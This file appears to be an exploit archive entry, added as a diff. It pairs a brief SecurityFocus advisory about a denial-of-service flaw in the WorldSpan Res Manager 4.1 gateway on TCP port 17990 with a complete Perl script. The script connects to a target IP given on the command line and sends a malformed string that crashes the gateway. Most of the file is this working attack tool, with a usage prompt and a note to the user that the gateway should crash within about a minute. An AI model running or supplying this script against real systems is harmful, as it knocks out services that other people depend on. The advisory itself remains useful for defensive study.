@@ -1,0 +1,31 @@
+source: http://www.securityfocus.com/bid/5169/info
+
+It has been reported that WorldSpan Res Manager 4.1 for Microsoft Windows is vulnerable to a denial of service condition.
+
+Res Manager systems are connected to Worldspan via private lines or through the Internet. Before accessing Worldspan, clients must first go through a local gateway, which accepts connections from Res Manager clients via TCP port 17990. If a malformed packet is sent to this port, the gateway software attempts to process the packet and eventually crashes.
+
+#!/usr/bin/perl
+#altomo@digitalgangsters.net
+#Worldspan Gateway DoS
+
+$sabre = "worldspanshouldgoboom";
+
+use IO::Socket;
+$ip = "$ARGV[0]";
+$port = "17990";
+if ($#ARGV<0) {
+print " useage: $0 <ip>\n";
+exit();
+}
+$socket = IO::Socket::INET->new(
+Proto=>"tcp",
+PeerAddr=>$ip,
+PeerPort=>$port,);
+
+
+print "Worldspan Gateway DoS\n";
+print "altomo\@digitalgangsters.net\n";
+
+print "Wait about a minute, and it should crash.\n";
+print $socket "$sabre\r";
+close $socket;
